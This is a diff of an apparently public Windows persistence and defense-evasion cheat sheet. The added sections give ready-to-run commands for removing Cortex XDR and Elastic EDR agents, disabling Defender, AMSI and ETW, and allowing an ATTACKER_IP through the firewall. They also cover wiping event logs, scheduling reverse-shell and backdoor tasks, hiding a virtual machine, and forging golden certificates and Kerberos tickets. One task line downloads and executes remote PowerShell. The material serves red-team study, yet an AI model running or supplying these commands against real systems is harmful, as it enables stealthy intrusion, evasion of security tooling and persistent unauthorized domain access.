@@ -4,8 +4,11 @@
 
 * [Tools](#tools)
 * [Hide Your Binary](#hide-your-binary)
-* [Disable Windows Defender](#disable-windows-defender)
-* [Disable Windows Firewall](#disable-windows-firewall)
+* [Disable Antivirus and Security](#disable-antivirus-and-security)
+    * [Antivirus Removal](#antivirus-removal)
+    * [Disable Windows Defender](#disable-windows-defender)
+    * [Disable Windows Firewall](#disable-windows-firewall)
+    * [Clear System and Security Logs](#clear-system-and-security-logs)
 * [Simple User](#simple-user)
     * [Registry HKCU](#registry-hkcu)
     * [Startup](#startup)
@@ -18,6 +21,7 @@
     * [Registry HKLM](#registry-hklm)
         * [Winlogon Helper DLL](#)
         * [GlobalFlag](#)
+    * [Startup Elevated](#startup-elevated)
     * [Services Elevated](#services-elevated)
     * [Scheduled Tasks Elevated](#scheduled-tasks-elevated)
     * [Binary Replacement](#binary-replacement)
@@ -28,6 +32,10 @@
         * [sethc.exe](#sethc.exe)
     * [Remote Desktop Services Shadowing](#remote-desktop-services-shadowing)
     * [Skeleton Key](#skeleton-key)
+    * [Virtual Machines](#virtual-machines)
+* [Domain](#domain)
+    * [Golden Certificate](#golden-certificate)
+    * [Golden Ticket](#golden-ticket)
 * [References](#references)
 
 
@@ -43,7 +51,42 @@
 PS> attrib +h mimikatz.exe
 ```
 
-## Disable Windows Defender
+## Disable Antivirus and Security
+
+### Antivirus Removal
+
+* [Sophos Removal Tool.ps1](https://github.com/ayeskatalas/Sophos-Removal-Tool/)
+* [Symantec CleanWipe](https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html)
+* [Elastic EDR/Security](https://www.elastic.co/guide/en/fleet/current/uninstall-elastic-agent.html)
+    ```ps1
+    cd "C:\Program Files\Elastic\Agent\"
+    PS C:\Program Files\Elastic\Agent> .\elastic-agent.exe uninstall
+    Elastic Agent will be uninstalled from your system at C:\Program Files\Elastic\Agent. Do you want to continue? [Y/n]:Y
+    Elastic Agent has been uninstalled.
+    ```
+* [Cortex XDR](https://mrd0x.com/cortex-xdr-analysis-and-bypass/)
+    ```ps1
+    # Global uninstall password: Password1
+    Password hash is located in C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
+    Look for PasswordHash, PasswordSalt or password, salt strings.
+
+    # Disable Cortex: Change the DLL to a random value, then REBOOT
+    reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
+
+    # Disables the agent on startup (requires reboot to work)
+    cytool.exe startup disable
+
+    # Disables protection on Cortex XDR files, processes, registry and services
+    cytool.exe protect disable
+
+    # Disables Cortex XDR (Even with tamper protection enabled)
+    cytool.exe runtime disable
+
+    # Disables event collection
+    cytool.exe event_collection disable
+    ```
+
+### Disable Windows Defender
 
 ```powershell
 # Disable Defender
@@ -51,17 +94,31 @@ sc config WinDefend start= disabled
 sc stop WinDefend
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Wipe currently stored definitions
-# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
-MpCmdRun.exe -RemoveDefinitions -All
-
 ## Exclude a process / location
 Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
 Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 Add-MpPreference -ExclusionPath C:\Video, C:\install
+
+# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+PS C:\> Set-MpPreference -DisableIOAVProtection $true
+# Disable AMSI (set to 0 to enable)
+PS C:\> Set-MpPreference -DisableScriptScanning 1 
+
+# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
+
+# Wipe currently stored definitions
+# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
+MpCmdRun.exe -RemoveDefinitions -All
+
+# Remove signatures (if Internet connection is present, they will be downloaded again):
+PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
+PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
 
-## Disable Windows Firewall
+
+### Disable Windows Firewall
 
 ```powershell
 Netsh Advfirewall show allprofiles
@@ -69,6 +126,13 @@ NetSh Advfirewall set allprofiles state off
 
 # ip whitelisting
 New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+```
+
+### Clear System and Security Logs
+
+```powershell
+cmd.exe /c wevtutil.exe cl System
+cmd.exe /c wevtutil.exe cl Security
 ```
 
 ## Simple User
@@ -122,36 +186,38 @@ SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -
 
 ### Scheduled Tasks User
 
-Using native **schtask**
+* Using native **schtask** - Create a new task
+    ```powershell
+    # Create the scheduled tasks to run once at 00.00
+    schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
+    # Force run it now !
+    schtasks /run /tn "Device-Synchronize"
+    ```
+* Using native **schtask** - Leverage the `schtasks /change` command to modify existing scheduled tasks
+    ```powershell
+    # Launch an executable by calling the ShellExec_RunDLL function.
+    SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
+    ```
 
-```powershell
-# Create the scheduled tasks to run once at 00.00
-schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
-# Force run it now !
-schtasks /run /tn "Device-Synchronize"
-```
+* Using Powershell
+    ```powershell
+    PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
+    PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
+    PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
+    PS C:\> $S = New-ScheduledTaskSettingsSet
+    PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
+    PS C:\> Register-ScheduledTask Backdoor -InputObject $D
+    ```
 
-Using Powershell
+* Using SharPersist
+    ```powershell
+    # Add to a current scheduled task
+    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
 
-```powershell
-PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
-PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
-PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
-PS C:\> $S = New-ScheduledTaskSettingsSet
-PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
-PS C:\> Register-ScheduledTask Backdoor -InputObject $D
-```
-
-Using SharPersist
-
-```powershell
-# Add to a current scheduled task
-SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
-
-# Add new task
-SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
-SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
-```
+    # Add new task
+    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
+    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
+    ```
 
 
 ### BITS Jobs
@@ -235,6 +301,13 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\not
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
 ```
 
+### Startup Elevated
+
+Create a batch script in the user startup folder.
+
+```powershell
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
+```
 
 ### Services Elevated
 
@@ -273,6 +346,7 @@ Register-ScheduledTask "Backdoor" -InputObject $D
 # Native schtasks
 schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
 schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
+schtasks /Create /RU "NT AUTHORITY\SYSTEM" /tn [TaskName] /tr "regsvr32.exe -s \"C:\Users\*\AppData\Local\Temp\[payload].dll\"" /SC ONCE /Z /ST [Time] /ET [Time]
 
 ##(X86) - On User Login
 schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
@@ -369,6 +443,102 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC
 Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
 ```
 
+
+### Virtual Machines
+
+> Based on the Shadow Bunny technique.
+
+```ps1
+# download virtualbox
+Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe
+
+# perform a silent install and avoid creating desktop and quick launch icons
+VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0
+
+# in \Program Files\Oracle\VirtualBox\VBoxManage.exe
+# Disabling notifications
+.\VBoxManage.exe setextradata global GUI/SuppressMessages "all" 
+
+# Download the Virtual machine disk
+Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd
+
+# Create a new VM
+$vmname = "IT Recovery"
+.\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register
+
+# Add a network card in NAT mode
+.\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
+.\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
+.\VBoxManage.exe modifyvm $vmname --nic1 nat
+.\VBoxManage.exe modifyvm $vmname --audio none
+.\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
+.\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"
+
+# Mount the VHD file
+.\VBoxManage.exe storagectl $vmname -name "SATA Controller" -add sata
+.\VBoxManage.exe storageattach $vmname -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0
+
+# Start the VM
+.\VBoxManage.exe startvm $vmname –type headless 
+
+
+# optional - adding a shared folder
+# require: VirtualBox Guest Additions
+.\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\ -automount
+# then mount the folder in the VM
+sudo mkdir /mnt/c
+sudo mount -t vboxsf shadow_c /mnt/c
+```
+
+
+## Domain
+
+### User Certificate
+
+```ps1
+# Request a certificate for the User template
+.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User
+
+# Convert the certificate for Rubeus
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+# Request a TGT using the certificate
+.\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
+```
+
+### Golden Certificate
+
+> Require elevated privileges in the Active Directory, or on the ADCS machine
+
+* Export CA as p12 file: `certsrv.msc` > `Right Click` > `Back up CA...`
+* Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER 
+    ```ps1
+    privilege::debug
+    crypto::capi
+    crypto::cng
+    crypto::certificates /systemstore:local_machine /store:my /export
+    ```
+* Alternative 2: Using SharpDPAPI, then convert the certificate: `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
+* [ForgeCert](https://github.com/GhostPack/ForgeCert) - Forge a certificate for any active domain user using the CA certificate
+    ```ps1
+    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
+    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
+    ```
+* Finally you can request a TGT using the Certificate
+    ```ps1
+    Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
+    ```
+
+### Golden Ticket
+
+> Forge a Golden ticket using Mimikatz
+
+```ps1
+kerberos::purge
+kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
+kerberos::tgt
+```
+
 ## References
 
 * [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
@@ -381,3 +551,5 @@ Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administr
 * [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)
 * [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
 * [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
+* [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
+* [Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi](https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/)
